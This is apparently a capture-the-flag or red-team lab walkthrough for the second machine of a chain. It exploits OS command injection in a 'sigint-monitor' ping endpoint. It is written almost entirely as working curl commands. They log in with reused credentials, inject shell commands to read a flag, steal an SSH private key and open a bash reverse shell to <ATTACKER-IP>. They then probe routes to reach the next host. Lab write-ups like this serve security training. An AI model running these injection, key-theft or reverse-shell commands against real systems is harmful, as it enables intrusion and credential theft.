# Red Team — M2: sigint-monitor

**Vulnerability:** OS Command Injection in `POST /api/diagnostic/ping`
**Technique:** T1059.004 — Unix Shell
**Entry:** Credentials from M1 SSRF: `monitor_admin : S1GN4L#Mon!tor`

---
<img width="1459" height="793" alt="image" src="https://github.com/user-attachments/assets/de7e4578-83ed-4548-9461-7e6028af6819" />


## Step 1 — Login

```bash
# Via browser: http://<M2-IP>:8080/login
# OR via curl:
curl -s -X POST http://172.24.4.51:8080/login \
  -c /tmp/cookies2.txt \
  -d "username=monitor_admin&password=S1GN4L%23Mon%21tor"
```

---

## Step 2 — Confirm Command Injection

Navigate to **DIAGNOSTICS → Node Reachability Check** and test:

```bash
# Via curl with session cookie:
curl -s -X POST http://172.24.4.51:8080/api/diagnostic/ping \
  -b /tmp/cookies2.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; id"}'

# Expected stdout: "uid=XXX(sigmon) gid=XXX"
```

The `host` parameter is passed to `ping -c 3 -W 2 <host>` via `shell=True`.

---

## Step 3 — Read Flag

```bash
curl -s -X POST http://172.24.4.51:8080/api/diagnostic/ping \
  -b /tmp/cookies2.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/sigmon/classified/flag2.txt"}'
```

---

## Step 4 — Extract SSH Key for M3

```bash
# Read the private key for sigops user on M3
curl -s -X POST http://<M2-IP>:8080/api/diagnostic/ping \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/monitor/keys/sigops_rsa"}'

# OR
curl -s -X POST http://172.24.4.51:8080/api/diagnostic/ping \
  -b /tmp/cookies2.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/monitor/keys/sigops_rsa"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['stdout'])"

# Save to local file:
# Copy the key from stdout (between -----BEGIN RSA PRIVATE KEY----- markers)
# Save as sigops_rsa and set permissions:
chmod 600 sigops_rsa
```

---

## Step 5 — Get Reverse Shell (Optional)

```bash
# nc -lvnp 4444  (on attacker machine)
curl -s -X POST http://<M2-IP>:8080/api/diagnostic/ping \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; bash -c \"bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1\""}'
```

---

## Step 6 — Discover M3

```bash
# From shell or via injection:
curl -s -X POST http://<M2-IP>:8080/api/diagnostic/ping \
  -b cookies.txt -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; ip route"}'
# Reveals DMZ subnet, scan for port 22:
# nmap -p 22 --open 11.0.0.0/8 --min-rate 2000
```

**Proceed to M3 with:** SSH key `sigops_rsa` + user `sigops`
